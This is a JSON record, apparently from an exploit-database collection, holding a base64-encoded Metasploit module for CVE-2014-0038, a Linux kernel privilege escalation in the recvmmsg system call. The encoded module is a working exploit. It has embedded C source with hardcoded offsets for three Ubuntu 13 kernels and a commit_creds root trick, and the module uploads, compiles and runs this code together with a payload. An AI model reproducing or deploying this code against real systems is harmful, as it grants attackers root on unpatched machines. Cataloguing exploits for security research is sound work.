{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICJtc2YvY29yZSINCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6TG9jYWwNCiAgUmFuayA9IEdvb2RSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OkZpbGUNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RmlsZURyb3BwZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICAgJ05hbWUnICAgICAgICAgICA9PiAnTGludXggS2VybmVsIDMuMTMuMSBSZWN2bW1zZyBQcml2aWxlZ2UgRXNjYWxhdGlvbicsDQogICAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgICAgVGhpcyBtb2R1bGUgYXR0ZW1wdHMgdG8gZXhwbG9pdCBDVkUtMjAxNC0wMDM4LCBieSBzZW5kaW5nIGEgcmVjdm1tc2cNCiAgICAgICAgICBzeXN0ZW0gY2FsbCB3aXRoIGEgY3JhZnRlZCB0aW1lb3V0IHBvaW50ZXIgcGFyYW1ldGVyIHRvIGdhaW4gcm9vdC4NCiAgICAgICAgICBUaGlzIGV4cGxvaXQgaGFzIG9mZnNldHMgZm9yIDMgVWJ1bnR1IDEzIGtlcm5lbHMgYnVpbHQgaW46DQogICAgICAgICAgMy44LjAtMTktZ2VuZXJpYyAoMTMuMDQgZGVmYXVsdCkNCiAgICAgICAgICAzLjExLjAtMTItZ2VuZXJpYyAoMTMuMTAgZGVmYXVsdCkNCiAgICAgICAgICAzLjExLjAtMTUtZ2VuZXJpYyAoMTMuMTApDQogICAgICAgICAgVGhpcyBleHBsb2l0IG1heSB0YWtlIHVwIHRvIDEzIG1pbnV0ZXMgdG8gcnVuIGR1ZSB0byBhIGRlY3JlbWVudGluZyAoMS9zZWMpDQogICAgICAgICAgcG9pbnRlciB3aGljaCBzdGFydHMgYXQgMHhmZiozICg3NjUgc2Vjb25kcykNCiAgICAgICAgfSwNCiAgICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICAgIFsNCiAgICAgICAgICAgICdoMDBkaWUgPG1pa2VAc2hvcmVicmVha3NlY3VyaXR5LmNvbT4nLCAgIyBNb2R1bGUNCiAgICAgICAgICAgICdyZWJlbCcgICAgICAgICAgICAgICAgICAgICAgICAgIyBEaXNjb3ZlcnkNCiAgICAgICAgICBdLA0KICAgICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdGZWIgMiAyMDE0JywNCiAgICAgICAgJ1BsYXRmb3JtJyAgICAgICA9PiBbICdsaW51eCddLA0KICAgICAgICAnQXJjaCcgICAgICAgICAgID0+IFsgQVJDSF9YODYsIEFSQ0hfWDg2XzY0IF0sDQogICAgICAgICdTZXNzaW9uVHlwZXMnICAgPT4gWyAnc2hlbGwnLCAnbWV0ZXJwcmV0ZXInIF0sDQogICAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICBbICdBdXRvJywgeyB9IF0NCiAgICAgICAgICBdLA0KICAgICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDAsDQogICAgICAgICdEZWZhdWx0T3B0aW9ucycgPT4geyAnV2ZzRGVsYXknID0+IDc4MCwgJ1ByZXBlbmRGb3JrJyA9PiB0cnVlLCB9LA0KICAgICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgICAgWw0KICAgICAgICAgICAgWyAnRURCJywgJzMxMzQ3J10sDQogICAgICAgICAgICBbICdFREInLCAnMzEzNDYnXSwNCiAgICAgICAgICAgIFsgJ0NWRScsICcyMDE0LTAwMzgnXSwNCiAgICAgICAgICAgIFsgJ1VSTCcsICdodHRwczovL2J1Z3MubGF1bmNocGFkLm5ldC91YnVudHUvK3NvdXJjZS9hcHBvcnQvK2J1Zy8xNDUzOTAwJ10NCiAgICAgICAgICBdDQogICAgICApKQ0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ1dyaXRhYmxlRGlyJywgWyB0cnVlLCAnQSBkaXJlY3Rvcnkgd2hlcmUgd2UgY2FuIHdyaXRlIGZpbGVzIChtdXN0IG5vdCBiZSBtb3VudGVkIG5vZXhlYyknLCAnL3RtcCcgXSksDQogICAgICAgIE9wdEVudW0ubmV3KCdDT01QSUxFJywgWyB0cnVlLCAnQ29tcGlsZSBvbiB0YXJnZXQnLCAnQXV0bycsIFsnQXV0bycsICdUcnVlJywgJ0ZhbHNlJ11dKQ0KICAgICAgXSwgc2VsZi5jbGFzcykNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgZGVmIGtlcm5lbF92dWxuPygpDQogICAgICBvc19pZCA9IGNtZF9leGVjKCdncmVwIF5JRD0gL2V0Yy9vcy1yZWxlYXNlJykNCiAgICAgIGlmIG9zX2lkID09ICdJRD11YnVudHUnDQogICAgICAgIGtlcm5lbCA9IEdlbTo6VmVyc2lvbi5uZXcoY21kX2V4ZWMoJy9iaW4vdW5hbWUgLXInKSkNCiAgICAgICAgY2FzZSBrZXJuZWwucmVsZWFzZS50b19zDQogICAgICAgIHdoZW4gJzMuMTEuMCcNCiAgICAgICAgICBpZiBrZXJuZWwgPT0gR2VtOjpWZXJzaW9uLm5ldygnMy4xMS4wLTE1LWdlbmVyaWMnKSB8fCBrZXJuZWwgPT0gR2VtOjpWZXJzaW9uLm5ldygnMy4xMS4wLTEyLWdlbmVyaWMnKQ0KICAgICAgICAgICAgdnByaW50X2dvb2QoIktlcm5lbCAje2tlcm5lbH0gaXMgZXhwbG9pdGFibGUiKQ0KICAgICAgICAgICAgcmV0dXJuIHRydWUNCiAgICAgICAgICBlbHNlDQogICAgICAgICAgICBwcmludF9lcnJvcigiS2VybmVsICN7a2VybmVsfSBpcyBOT1QgdnVsbmVyYWJsZSBvciBOT1QgZXhwbG9pdGFibGUiKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlDQogICAgICAgICAgZW5kDQogICAgICAgIHdoZW4gJzMuOC4wJw0KICAgICAgICAgIGlmIGtlcm5lbCA9PSBHZW06OlZlcnNpb24ubmV3KCczLjguMC0xOS1nZW5lcmljJykNCiAgICAgICAgICAgIHZwcmludF9nb29kKCJLZXJuZWwgI3trZXJuZWx9IGlzIGV4cGxvaXRhYmxlIikNCiAgICAgICAgICAgIHJldHVybiB0cnVlDQogICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcHJpbnRfZXJyb3IoIktlcm5lbCAje2tlcm5lbH0gaXMgTk9UIHZ1bG5lcmFibGUgb3IgTk9UIGV4cGxvaXRhYmxlIikNCiAgICAgICAgICAgIHJldHVybiBmYWxzZQ0KICAgICAgICAgIGVuZA0KICAgICAgICBlbHNlDQogICAgICAgICAgcHJpbnRfZXJyb3IoIk5vbi12dWxuIGtlcm5lbCAje2tlcm5lbH0iKQ0KICAgICAgICAgIHJldHVybiBmYWxzZQ0KICAgICAgICBlbmQNCiAgICAgIGVsc2UNCiAgICAgICAgcHJpbnRfZXJyb3IoIlVua25vd24gT1M6ICN7b3NfaWR9IikNCiAgICAgICAgcmV0dXJuIGZhbHNlDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIGlmIGtlcm5lbF92dWxuPygpDQogICAgICByZXR1cm4gQ2hlY2tDb2RlOjpBcHBlYXJzDQogICAgZWxzZQ0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KDQogICAgaWYgY2hlY2sgIT0gQ2hlY2tDb2RlOjpBcHBlYXJzDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm90VnVsbmVyYWJsZSwgJ1RhcmdldCBub3QgdnVsbmVyYWJsZSEgcHVudCEnKQ0KICAgIGVuZA0KDQoNCiAgICAjIGRpcmVjdCBjb3B5IG9mIGNvZGUgZnJvbSBleHBsb2l0LWRiLiAgSSByZW1vdmVkIGEgbG90IG9mIHRoZSBjb21tZW50cyBpbiB0aGUgdGl0bGUgYXJlYSBqdXN0IHRvIGN1dCBkb3duIG9uIHNpemUNCg0KICAgIHJlY3ZtbXNnID0gJXF7DQogICAgICAvKg0KICAgICAgKj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kj0qPSo9Kg0KICAgICAgcmVjdm1tc2cuYyAtIGxpbnV4IDMuNCsgbG9jYWwgcm9vdCAoQ09ORklHX1g4Nl9YMzI9eSkNCiAgICAgIENWRS0yMDE0LTAwMzggLyB4MzIgQUJJIHdpdGggcmVjdm1tc2cNCiAgICAgIGJ5IHJlYmVsIEAgaXJjLnNtYXNodGhlc3RhY2sub3JnDQogICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgKi8NCg0KICAgICAgI2RlZmluZSBfR05VX1NPVVJDRQ0KICAgICAgI2luY2x1ZGUgPG5ldGluZXQvaXAuaD4NCiAgICAgICNpbmNsdWRlIDxzdGRpby5oPg0KICAgICAgI2luY2x1ZGUgPHN0ZGxpYi5oPg0KICAgICAgI2luY2x1ZGUgPHN0cmluZy5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiAgICAgICNpbmNsdWRlIDx1bmlzdGQuaD4NCiAgICAgICNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiAgICAgICNpbmNsdWRlIDxmY250bC5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy91dHNuYW1lLmg+DQoNCiAgICAgICNkZWZpbmUgX19YMzJfU1lTQ0FMTF9CSVQgMHg0MDAwMDAwMA0KICAgICAgI3VuZGVmIF9fTlJfcmVjdm1tc2cNCiAgICAgICNkZWZpbmUgX19OUl9yZWN2bW1zZyAoX19YMzJfU1lTQ0FMTF9CSVQgKyA1MzcpDQogICAgICAjZGVmaW5lIFZMRU4gMQ0KICAgICAgI2RlZmluZSBCVUZTSVpFIDIwMA0KDQogICAgICBpbnQgcG9ydDsNCg0KICAgICAgc3RydWN0IG9mZnNldCB7DQogICAgICAgICAgY2hhciAqa2VybmVsX3ZlcnNpb247DQogICAgICAgICAgdW5zaWduZWQgbG9uZyBkZXN0OyAvLyBuZXRfc3lzY3RsX3Jvb3QgKyA5Ng0KICAgICAgICAgIHVuc2lnbmVkIGxvbmcgb3JpZ2luYWxfdmFsdWU7IC8vIG5ldF9jdGxfcGVybWlzc2lvbnMNCiAgICAgICAgICB1bnNpZ25lZCBsb25nIHByZXBhcmVfa2VybmVsX2NyZWQ7DQogICAgICAgICAgdW5zaWduZWQgbG9uZyBjb21taXRfY3JlZHM7DQogICAgICB9Ow0KDQogICAgICBzdHJ1Y3Qgb2Zmc2V0IG9mZnNldHNbXSA9IHsNCiAgICAgICAgICB7IjMuMTEuMC0xNS1nZW5lcmljIiwweGZmZmZmZmZmODFjZGY0MDArOTYsMHhmZmZmZmZmZjgxNmQ0ZmYwLDB4ZmZmZmZmZmY4MTA4YWZiMCwweGZmZmZmZmZmODEwOGFjZTB9LCAvLyBVYnVudHUgMTMuMTANCiAgICAgICAgICB7IjMuMTEuMC0xMi1nZW5lcmljIiwweGZmZmZmZmZmODFjZGYzYTAsMHhmZmZmZmZmZjgxNmQzMmEwLDB4ZmZmZmZmZmY4MTA4YjAxMCwweGZmZmZmZmZmODEwOGFkNDB9LCAvLyBVYnVudHUgMTMuMTANCiAgICAgICAgICB7IjMuOC4wLTE5LWdlbmVyaWMiLDB4ZmZmZmZmZmY4MWNjNzk0MCwweGZmZmZmZmZmODE2YTdmNDAsMHhmZmZmZmZmZjgxMDg0N2MwLCAweGZmZmZmZmZmODEwODQ1MDB9LCAvLyBVYnVudHUgMTMuMDQNCiAgICAgICAgICB7TlVMTCwwLDAsMCwwfQ0KICAgICAgfTsNCg0KICAgICAgdm9pZCB1ZHAoaW50IGIpIHsNCiAgICAgICAgICBpbnQgc29ja2ZkOw0KICAgICAgICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2YWRkcixjbGlhZGRyOw0KICAgICAgICAgIGludCBzID0gMHhmZisxOw0KDQogICAgICAgICAgaWYoZm9yaygpID09IDApIHsNCiAgICAgICAgICAgICAgd2hpbGUocyA+IDApIHsNCiAgICAgICAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCJccmJ5dGUgJWQgLyAzLi4gfiVkIHNlY3MgbGVmdCAgICBcYlxiXGJcYiIsYisxLDMqMHhmZiAtIGIqMHhmZiAtICgweGZmKzEtcykpOw0KICAgICAgICAgICAgICAgICAgc2xlZXAoMSk7DQogICAgICAgICAgICAgICAgICBzLS07DQogICAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwiLiIpOw0KICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgc29ja2ZkID0gc29ja2V0KEFGX0lORVQsU09DS19ER1JBTSwwKTsNCiAgICAgICAgICAgICAgYnplcm8oJnNlcnZhZGRyLHNpemVvZihzZXJ2YWRkcikpOw0KICAgICAgICAgICAgICBzZXJ2YWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiAgICAgICAgICAgICAgc2VydmFkZHIuc2luX2FkZHIuc19hZGRyPWh0b25sKElOQUREUl9MT09QQkFDSyk7DQogICAgICAgICAgICAgIHNlcnZhZGRyLnNpbl9wb3J0PWh0b25zKHBvcnQpOw0KICAgICAgICAgICAgICBzZW5kdG8oc29ja2ZkLCIxIiwxLDAsKHN0cnVjdCBzb2NrYWRkciAqKSZzZXJ2YWRkcixzaXplb2Yoc2VydmFkZHIpKTsNCiAgICAgICAgICAgICAgZXhpdCgwKTsNCiAgICAgICAgICB9DQoNCiAgICAgIH0NCg0KICAgICAgdm9pZCB0cmlnZ2VyKCkgew0KICAgICAgICAgIG9wZW4oIi9wcm9jL3N5cy9uZXQvY29yZS9zb21heGNvbm4iLE9fUkRPTkxZKTsNCg0KICAgICAgICAgIGlmKGdldHVpZCgpICE9IDApIHsNCiAgICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsIm5vdCByb290LCB5YSBibGV3IGl0IVxuIik7DQogICAgICAgICAgICAgIGV4aXQoLTEpOw0KICAgICAgICAgIH0NCg0KICAgICAgICAgIGZwcmludGYoc3RkZXJyLCJ3MDBwIHcwMHAhXG4iKTsNCiAgICAgICAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICAgIH0NCg0KICAgICAgdHlwZWRlZiBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9jb21taXRfY3JlZHMpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQogICAgICB0eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9wcmVwYXJlX2tlcm5lbF9jcmVkKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KICAgICAgX2NvbW1pdF9jcmVkcyBjb21taXRfY3JlZHM7DQogICAgICBfcHJlcGFyZV9rZXJuZWxfY3JlZCBwcmVwYXJlX2tlcm5lbF9jcmVkOw0KDQogICAgICAvLyB0aHggYmxpc3MNCiAgICAgIHN0YXRpYyBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpDQogICAgICBnZXRyb290KHZvaWQgKmhlYWQsIHZvaWQgKiB0YWJsZSkNCiAgICAgIHsNCiAgICAgICAgICBjb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7DQogICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgfQ0KDQogICAgICB2b2lkIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKQ0KICAgICAgdHJhbXBvbGluZSgpDQogICAgICB7DQogICAgICAgICAgYXNtKCJtb3YgJGdldHJvb3QsICVyYXg7IGNhbGwgKiVyYXg7Iik7DQogICAgICB9DQoNCiAgICAgIGludCBtYWluKHZvaWQpDQogICAgICB7DQogICAgICAgICAgaW50IHNvY2tmZCwgcmV0dmFsLCBpOw0KICAgICAgICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBzYTsNCiAgICAgICAgICBzdHJ1Y3QgbW1zZ2hkciBtc2dzW1ZMRU5dOw0KICAgICAgICAgIHN0cnVjdCBpb3ZlYyBpb3ZlY3NbVkxFTl07DQogICAgICAgICAgY2hhciBidWZbQlVGU0laRV07DQogICAgICAgICAgbG9uZyBtbWFwcGVkOw0KICAgICAgICAgIHN0cnVjdCB1dHNuYW1lIHU7DQogICAgICAgICAgc3RydWN0IG9mZnNldCAqb2ZmID0gTlVMTDsNCg0KICAgICAgICAgIHVuYW1lKCZ1KTsNCg0KICAgICAgICAgIGZvcihpPTA7b2Zmc2V0c1tpXS5rZXJuZWxfdmVyc2lvbiAhPSBOVUxMO2krKykgew0KICAgICAgICAgICAgICBpZighc3RyY21wKG9mZnNldHNbaV0ua2VybmVsX3ZlcnNpb24sdS5yZWxlYXNlKSkgew0KICAgICAgICAgICAgICAgICAgb2ZmID0gJm9mZnNldHNbaV07DQogICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCg0KICAgICAgICAgIGlmKCFvZmYpIHsNCiAgICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsIm5vIG9mZnNldHMgZm9yIHRoaXMga2VybmVsIHZlcnNpb24uLlxuIik7DQogICAgICAgICAgICAgIGV4aXQoLTEpOw0KICAgICAgICAgIH0NCg0KICAgICAgICAgIG1tYXBwZWQgPSAob2ZmLT5vcmlnaW5hbF92YWx1ZSAgJiB+KHN5c2NvbmYoX1NDX1BBR0VfU0laRSkgLSAxKSk7DQogICAgICAgICAgbW1hcHBlZCAmPSAweDAwMDAwMGZmZmZmZmZmZmY7DQoNCiAgICAgICAgICAgICAgc3JhbmQodGltZShOVUxMKSk7DQogICAgICAgICAgcG9ydCA9IChyYW5kKCkgJSAzMDAwMCkrMTUwMDsNCg0KICAgICAgICAgIGNvbW1pdF9jcmVkcyA9IChfY29tbWl0X2NyZWRzKW9mZi0+Y29tbWl0X2NyZWRzOw0KICAgICAgICAgIHByZXBhcmVfa2VybmVsX2NyZWQgPSAoX3ByZXBhcmVfa2VybmVsX2NyZWQpb2ZmLT5wcmVwYXJlX2tlcm5lbF9jcmVkOw0KDQogICAgICAgICAgbW1hcHBlZCA9IChsb25nKW1tYXAoKHZvaWQgKiltbWFwcGVkLCBzeXNjb25mKF9TQ19QQUdFX1NJWkUpKjMsIFBST1RfUkVBRHxQUk9UX1dSSVRFfFBST1RfRVhFQywgTUFQX1BSSVZBVEV8TUFQX0FOT05ZTU9VU3xNQVBfRklYRUQsIDAsIDApOw0KDQogICAgICAgICAgaWYobW1hcHBlZCA9PSAtMSkgew0KICAgICAgICAgICAgICBwZXJyb3IoIm1tYXAoKSIpOw0KICAgICAgICAgICAgICBleGl0KC0xKTsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICBtZW1zZXQoKGNoYXIgKiltbWFwcGVkLDB4OTAsc3lzY29uZihfU0NfUEFHRV9TSVpFKSozKTsNCg0KICAgICAgICAgIG1lbWNweSgoY2hhciAqKW1tYXBwZWQgKyBzeXNjb25mKF9TQ19QQUdFX1NJWkUpLCAoY2hhciAqKSZ0cmFtcG9saW5lLCAzMDApOw0KDQogICAgICAgICAgaWYobXByb3RlY3QoKHZvaWQgKiltbWFwcGVkLCBzeXNjb25mKF9TQ19QQUdFX1NJWkUpKjMsIFBST1RfUkVBRHxQUk9UX0VYRUMpICE9IDApIHsNCiAgICAgICAgICAgICAgcGVycm9yKCJtcHJvdGVjdCgpIik7DQogICAgICAgICAgICAgIGV4aXQoLTEpOw0KICAgICAgICAgIH0NCg0KICAgICAgICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX0RHUkFNLCAwKTsNCiAgICAgICAgICBpZiAoc29ja2ZkID09IC0xKSB7DQogICAgICAgICAgICAgIHBlcnJvcigic29ja2V0KCkiKTsNCiAgICAgICAgICAgICAgZXhpdCgtMSk7DQogICAgICAgICAgfQ0KDQogICAgICAgICAgc2Euc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgICAgICAgc2Euc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0xPT1BCQUNLKTsNCiAgICAgICAgICBzYS5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOw0KDQogICAgICAgICAgaWYgKGJpbmQoc29ja2ZkLCAoc3RydWN0IHNvY2thZGRyICopICZzYSwgc2l6ZW9mKHNhKSkgPT0gLTEpIHsNCiAgICAgICAgICAgICAgcGVycm9yKCJiaW5kKCkiKTsNCiAgICAgICAgICAgICAgZXhpdCgtMSk7DQogICAgICAgICAgfQ0KDQogICAgICAgICAgbWVtc2V0KG1zZ3MsIDAsIHNpemVvZihtc2dzKSk7DQoNCiAgICAgICAgICBpb3ZlY3NbMF0uaW92X2Jhc2UgPSAmYnVmOw0KICAgICAgICAgIGlvdmVjc1swXS5pb3ZfbGVuID0gQlVGU0laRTsNCiAgICAgICAgICBtc2dzWzBdLm1zZ19oZHIubXNnX2lvdiA9ICZpb3ZlY3NbMF07DQogICAgICAgICAgbXNnc1swXS5tc2dfaGRyLm1zZ19pb3ZsZW4gPSAxOw0KDQogICAgICAgICAgZm9yKGk9MDtpIDwgMyA7aSsrKSB7DQogICAgICAgICAgICAgIHVkcChpKTsNCiAgICAgICAgICAgICAgcmV0dmFsID0gc3lzY2FsbChfX05SX3JlY3ZtbXNnLCBzb2NrZmQsIG1zZ3MsIFZMRU4sIDAsICh2b2lkICopb2ZmLT5kZXN0KzctaSk7DQogICAgICAgICAgICAgIGlmKCFyZXR2YWwpIHsNCiAgICAgICAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCJcbnJlY3ZtbXNnKCkgZmFpbGVkXG4iKTsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCg0KICAgICAgICAgIGNsb3NlKHNvY2tmZCk7DQogICAgICAgICAgZnByaW50ZihzdGRlcnIsIlxuIik7DQogICAgICAgICAgdHJpZ2dlcigpOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIGZpbGVuYW1lID0gcmFuZF90ZXh0X2FscGhhbnVtZXJpYyg4KQ0KICAgIGV4ZWN1dGFibGVfcGF0aCA9ICIje2RhdGFzdG9yZVsnV3JpdGFibGVEaXInXX0vI3tmaWxlbmFtZX0iDQogICAgcGF5bG9hZG5hbWUgPSByYW5kX3RleHRfYWxwaGFudW1lcmljKDgpDQogICAgcGF5bG9hZF9wYXRoID0gIiN7ZGF0YXN0b3JlWydXcml0YWJsZURpciddfS8je3BheWxvYWRuYW1lfSINCg0KICAgIGRlZiBoYXNfcHJlcmVxcz8oKQ0KICAgICAgZ2NjID0gY21kX2V4ZWMoJ3doaWNoIGdjYycpDQogICAgICBpZiBnY2MuaW5jbHVkZT8oJ2djYycpDQogICAgICAgIHZwcmludF9nb29kKCdnY2MgaXMgaW5zdGFsbGVkJykNCiAgICAgIGVsc2UNCiAgICAgICAgcHJpbnRfZXJyb3IoJ2djYyBpcyBub3QgaW5zdGFsbGVkLiAgQ29tcGlsaW5nIHdpbGwgZmFpbC4nKQ0KICAgICAgZW5kDQogICAgICByZXR1cm4gZ2NjLmluY2x1ZGU/KCdnY2MnKQ0KICAgIGVuZA0KDQogICAgY29tcGlsZSA9IGZhbHNlDQogICAgaWYgZGF0YXN0b3JlWydDT01QSUxFJ10gPT0gJ0F1dG8nIHx8IGRhdGFzdG9yZVsnQ09NUElMRSddID09ICdUcnVlJw0KICAgICAgaWYgaGFzX3ByZXJlcXM/KCkNCiAgICAgICAgY29tcGlsZSA9IHRydWUNCiAgICAgICAgdnByaW50X3N0YXR1cygnTGl2ZSBjb21waWxpbmcgZXhwbG9pdCBvbiBzeXN0ZW0nKQ0KICAgICAgZWxzZQ0KICAgICAgICB2cHJpbnRfc3RhdHVzKCdEcm9wcGluZyBwcmUtY29tcGlsZWQgZXhwbG9pdCBvbiBzeXN0ZW0nKQ0KICAgICAgZW5kDQogICAgZW5kDQogICAgaWYgY2hlY2sgIT0gQ2hlY2tDb2RlOjpBcHBlYXJzDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm90VnVsbmVyYWJsZSwgJ1RhcmdldCBub3QgdnVsbmVyYWJsZSEgcHVudCEnKQ0KICAgIGVuZA0KDQogICAgZGVmIHVwbG9hZF9hbmRfY2htb2QoZm5hbWUsZmNvbnRlbnQpDQogICAgICBwcmludF9zdGF0dXMgIldyaXRpbmcgdG8gI3tmbmFtZX0gKCN7ZmNvbnRlbnQuc2l6ZX0gYnl0ZXMpIg0KICAgICAgcm1fZiBmbmFtZQ0KICAgICAgd3JpdGVfZmlsZShmbmFtZSwgZmNvbnRlbnQpDQogICAgICBjbWRfZXhlYygiY2htb2QgK3ggI3tmbmFtZX0iKQ0KICAgICAgcmVnaXN0ZXJfZmlsZV9mb3JfY2xlYW51cChmbmFtZSkNCiAgICBlbmQNCg0KICAgIGlmIGNvbXBpbGUNCiAgICAgIHJlY3ZtbXNnLmdzdWIhKC9zeXN0ZW1cKCJcL2Jpblwvc2ggLWkiXCk7LywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgInN5c3RlbShcIiN7cGF5bG9hZF9wYXRofVwiKTsiKQ0KICAgICAgdXBsb2FkX2FuZF9jaG1vZCgiI3tleGVjdXRhYmxlX3BhdGh9LmMiLCByZWN2bW1zZykNCiAgICAgIHZwcmludF9zdGF0dXMoIkNvbXBpbGluZyAje2V4ZWN1dGFibGVfcGF0aH0uYyIpDQogICAgICBjbWRfZXhlYygiZ2NjIC1vICN7ZXhlY3V0YWJsZV9wYXRofSAje2V4ZWN1dGFibGVfcGF0aH0uYyIpICNjb21waWxlDQogICAgICByZWdpc3Rlcl9maWxlX2Zvcl9jbGVhbnVwKGV4ZWN1dGFibGVfcGF0aCkNCiAgICBlbHNlDQogICAgICBwYXRoID0gOjpGaWxlLmpvaW4oIE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTQtMDAzOCcsICdyZWN2bW1zZycpDQogICAgICBmZCA9IDo6RmlsZS5vcGVuKCBwYXRoLCAicmIiKQ0KICAgICAgcmVjdm1tc2cgPSBmZC5yZWFkKGZkLnN0YXQuc2l6ZSkNCiAgICAgIGZkLmNsb3NlDQogICAgICB1cGxvYWRfYW5kX2NobW9kKGV4ZWN1dGFibGVfcGF0aCwgcmVjdm1tc2cpDQogICAgICAjIG92ZXJ3cml0ZSB3aXRoIHRoZSBoYXJkY29kZWQgdmFyaWFibGUgbmFtZXMgaW4gdGhlIGNvbXBpbGVkIHZlcnNpb25zDQogICAgICBwYXlsb2FkX2ZpbGVuYW1lID0gJ2EwUndBYWNVJw0KICAgICAgcGF5bG9hZF9wYXRoID0gIi90bXAvI3twYXlsb2FkX2ZpbGVuYW1lfSINCiAgICBlbmQNCg0KICAgIHVwbG9hZF9hbmRfY2htb2QocGF5bG9hZF9wYXRoLCBnZW5lcmF0ZV9wYXlsb2FkX2V4ZSkNCiAgICBzdGltZSA9IFRpbWUubm93DQogICAgdnByaW50X3N0YXR1cygiRXhwbG9pdGluZy4uLiBNYXkgdGFrZSAxM21pbi4gIFN0YXJ0IHRpbWU6ICN7c3RpbWV9IikNCiAgICBvdXRwdXQgPSBjbWRfZXhlYyhleGVjdXRhYmxlX3BhdGgpDQogICAgb3V0cHV0LmVhY2hfbGluZSB7IHxsaW5lfCB2cHJpbnRfc3RhdHVzKGxpbmUuY2hvbXApIH0NCiAgZW5kDQplbmQ=", 
    "filename": "platforms/linux/local/40503.rb", 
    "id": "40503", 
    "cves": [
        "CVE-2014-0038"
    ]
}